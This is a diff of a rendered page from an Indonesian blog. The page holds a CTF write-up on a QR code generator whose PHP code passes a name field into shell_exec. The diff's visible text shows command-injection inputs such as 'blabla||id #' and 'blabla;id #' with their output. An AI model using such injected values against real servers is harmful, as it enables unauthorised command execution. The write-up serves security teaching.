@@ -9,20 +9,20 @@
 	<meta name="description" content="">
 		<meta property="og:title" content="Solution for QR Generator Challenges" />
 <meta property="og:description" content="Setelah sekian lama tidak membuat challenges akhirnya kepikiran juga membuat challenges sederhana, Challenges ini bertemakan QR Code Generator, namun letak vulnerability-nya tidak pada QR Code tersebut, lalu berikut adalah cara sederhana menyelesaikannya
-  Diberikan Challenges
+Diberikan Challenges
 Seperti biasa, challenges dipost di group Surabaya Hacker Link, ternyata tidak ada clue dari challenges ini, langung tancap gas kita akses web tersebut. Ternyata sebuah page QR Generator dengan inputan nama dan instagram.
-  Pengecekan Source Code" />
+Pengecekan Source Code" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://potato.id/posts/solution-for-qr-generator-challenges/" />
+<meta property="og:url" content="https://potato.id/posts/solution-for-qr-generator-challenges/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-09-04T00:00:00+00:00" />
 <meta property="article:modified_time" content="2019-09-04T00:00:00+00:00" />
 
-		<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Solution for QR Generator Challenges"/>
+
+		<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Solution for QR Generator Challenges"/>
 <meta name="twitter:description" content="Setelah sekian lama tidak membuat challenges akhirnya kepikiran juga membuat challenges sederhana, Challenges ini bertemakan QR Code Generator, namun letak vulnerability-nya tidak pada QR Code tersebut, lalu berikut adalah cara sederhana menyelesaikannya
-  Diberikan Challenges
+Diberikan Challenges
 Seperti biasa, challenges dipost di group Surabaya Hacker Link, ternyata tidak ada clue dari challenges ini, langung tancap gas kita akses web tersebut. Ternyata sebuah page QR Generator dengan inputan nama dan instagram.
-  Pengecekan Source Code"/>
+Pengecekan Source Code"/>
 
 	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 	<link rel="dns-prefetch" href="//fonts.googleapis.com">
@@ -106,8 +106,7 @@ Seperti biasa, challenges dipost di group Surabaya Hacker Link, ternyata tidak a
 		<img class="thumbnail__image" src="/img/qr/banner.webp" alt="Solution for QR Generator Challenges">
 		
 	</figure><div class="content post__content clearfix">
-			<p><img src="/img/qr/banner.webp" alt="Welcome ">
-Setelah sekian lama tidak membuat challenges akhirnya kepikiran juga membuat challenges sederhana,
+			<p>Setelah sekian lama tidak membuat challenges akhirnya kepikiran juga membuat challenges sederhana,
 Challenges ini bertemakan QR Code Generator, namun letak vulnerability-nya tidak pada QR Code tersebut, lalu berikut adalah cara sederhana menyelesaikannya</p>
 <ol>
 <li>
@@ -161,32 +160,32 @@ Kita baca file index.php dan ada fungsi yang cukup berbahaya, yaitu shell_exec d
 Ternyata fungsi ini akan dijalankan ketika terdapat nama file yang sama yang ada pada variable $path, dan kode yang dieksekusi akan seperti ini</p>
 </li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /var/www/html/uploaded/&lt;hasil input field nama&gt;.jpeg
-</code></pre></div><p>pada shell terdapat beberapa unique char yang menjalankan suatu fungsi seperti <code>||</code> yang berarti or, <code>&amp;&amp;</code> yang berarti and, dsb<br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rm /var/www/html/uploaded/&lt;hasil input field nama&gt;.jpeg
+</span></span></code></pre></div><p>pada shell terdapat beberapa unique char yang menjalankan suatu fungsi seperti <code>||</code> yang berarti or, <code>&amp;&amp;</code> yang berarti and, dsb<br>
 langsung saja kita membuat dan mencoba payload sederhana di lokal kita</p>
 <hr>
 <p>Input nama: blabla||id #</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /var/www/html/uploaded/blabla<span style="color:#f92672">||</span>id <span style="color:#75715e">#.jpeg</span>
-rm: cannot remove <span style="color:#e6db74">&#39;/var/www/html/uploaded/blabla&#39;</span>: File not found
-uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span>
-</code></pre></div><p>Detail: double pipe (||) berfungsi sebagai fungsi or, dimana jika command remove gagal maka akan menjalankan command id dan tagar (#) berfungsi melakukan commenting terhadap string .jpeg<br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rm /var/www/html/uploaded/blabla<span style="color:#f92672">||</span>id <span style="color:#75715e">#.jpeg</span>
+</span></span><span style="display:flex;"><span>rm: cannot remove <span style="color:#e6db74">&#39;/var/www/html/uploaded/blabla&#39;</span>: File not found
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Detail: double pipe (||) berfungsi sebagai fungsi or, dimana jika command remove gagal maka akan menjalankan command id dan tagar (#) berfungsi melakukan commenting terhadap string .jpeg<br>
 Hasil: command id berjalan</p>
 <hr>
 <p>Input nama: blabla||id &amp;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /var/www/html/uploaded/blabla<span style="color:#f92672">||</span>id &amp;.jpeg
-<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">12331</span>
--bash: .jpeg: command not found
-rm: cannot remove <span style="color:#e6db74">&#39;/var/www/html/uploaded/blabla&#39;</span>: File not found
-uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span>
-<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+ Done rm /var/www/html/uploaded/blabla <span style="color:#f92672">||</span> id
-</code></pre></div><p>Detail: double pipe (||) berfungsi sebagai fungsi or, dimana jika command remove gagal maka akan menjalankan command id dan (&amp;) berfungsi melakukan melakukan redirection ke background namun .jpeg akan dijalankan dengan command
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rm /var/www/html/uploaded/blabla<span style="color:#f92672">||</span>id &amp;.jpeg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">12331</span>
+</span></span><span style="display:flex;"><span>-bash: .jpeg: command not found
+</span></span><span style="display:flex;"><span>rm: cannot remove <span style="color:#e6db74">&#39;/var/www/html/uploaded/blabla&#39;</span>: File not found
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>+ Done rm /var/www/html/uploaded/blabla <span style="color:#f92672">||</span> id
+</span></span></code></pre></div><p>Detail: double pipe (||) berfungsi sebagai fungsi or, dimana jika command remove gagal maka akan menjalankan command id dan (&amp;) berfungsi melakukan melakukan redirection ke background namun .jpeg akan dijalankan dengan command
 Hasil: command id berjalan</p>
 <hr>
 <p>Input: blabla;id #</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /var/www/html/uploaded/blabla;id <span style="color:#75715e">#.jpeg</span>
-rm: cannot remove <span style="color:#e6db74">&#39;/var/www/html/uploaded/blabla&#39;</span>: File not found
-uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span>
-</code></pre></div><p>Detail: semicolon (;) berfungsi memisakan command sebelumnya (rm) dan tagar (#) berfungsi melakukan commenting terhadap string .jpeg<br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rm /var/www/html/uploaded/blabla;id <span style="color:#75715e">#.jpeg</span>
+</span></span><span style="display:flex;"><span>rm: cannot remove <span style="color:#e6db74">&#39;/var/www/html/uploaded/blabla&#39;</span>: File not found
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>lazt<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Detail: semicolon (;) berfungsi memisakan command sebelumnya (rm) dan tagar (#) berfungsi melakukan commenting terhadap string .jpeg<br>
 Hasil: command id berjalan</p>
 <ol start="11">
 <li>
@@ -272,9 +271,9 @@ Bash Cheatsheet -&gt; <a href="https://devhints.io/bash.html">Read more&hellip;<
 		</a>
 	</div>
 	<div class="pager__item pager__item--next">
-		<a class="pager__link" href="/posts/harderning-server-with-fail2ban-to-telegram/" rel="next">
+		<a class="pager__link" href="/posts/menulis-laporan-bug/" rel="next">
 			<span class="pager__subtitle">Next&thinsp;»</span>
-			<p class="pager__title">Harderning Server with Fail2ban and Reporting to Telegram</p>
+			<p class="pager__title">Menulis Laporan Vulnerability Findings dengan Baik</p>
 		</a>
 	</div>
 </nav>
@@ -285,8 +284,8 @@ Bash Cheatsheet -&gt; <a href="https://devhints.io/bash.html">Read more&hellip;<
     <div id="disqus-comments">
       
         <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
+<script>
+    window.disqus_config = function () {
     
     
     
@@ -341,11 +340,11 @@ Bash Cheatsheet -&gt; <a href="https://devhints.io/bash.html">Read more&hellip;<
 	<h4 class="widget__title">Recent Posts</h4>
 	<div class="widget__content">
 		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/posts/apakah-xss-itu-berbahaya/">Apakah XSS Itu Berbahaya ?</a></li>
+			<li class="widget__item"><a class="widget__link" href="/posts/malwared-ads-continued/">Iklan yang menarik atau mencurigakan lanjutan</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/dictionary-attack/">Dictionary Attack</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/malwared-ads/">Iklan yang menarik atau mencurigakan ?</a></li>
 			<li class="widget__item"><a class="widget__link" href="/posts/secure-surfing-practice/">Secure Surfing Practice</a></li>
-			<li class="widget__item"><a class="widget__link" href="/posts/lesson-learned-from-ransomware/">Lesson Learned from Ransomware</a></li>
-			<li class="widget__item"><a class="widget__link" href="/posts/it-was-dns/">Yes, It was DNS!</a></li>
 		</ul>
 	</div>
 </div>
@@ -391,7 +390,7 @@ Bash Cheatsheet -&gt; <a href="https://devhints.io/bash.html">Read more&hellip;<
 		<a class="widget-taglist__link widget__link btn" href="/tags/terminal/" title="Terminal">Terminal (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/virtual-machine/" title="Virtual Machine">Virtual Machine (1)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/wordpress/" title="Wordpress">Wordpress (1)</a>
-		<a class="widget-taglist__link widget__link btn" href="/tags/write-up/" title="Write Up">Write Up (14)</a>
+		<a class="widget-taglist__link widget__link btn" href="/tags/write-up/" title="Write Up">Write Up (17)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/xss/" title="XSS">XSS (3)</a>
 		<a class="widget-taglist__link widget__link btn" href="/tags/zimbra-mail-server/" title="Zimbra mail server">Zimbra mail server (1)</a>
 	</div>
@@ -439,7 +438,7 @@ Bash Cheatsheet -&gt; <a href="https://devhints.io/bash.html">Read more&hellip;<
 	<div class="container footer__container flex">
 		
 		<div class="footer__copyright">
-			&copy; 2023 Ardi Jonias Fortuna.
+			&copy; 2024 Ardi Jonias Fortuna.
 			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
 		</div>
 	</div>
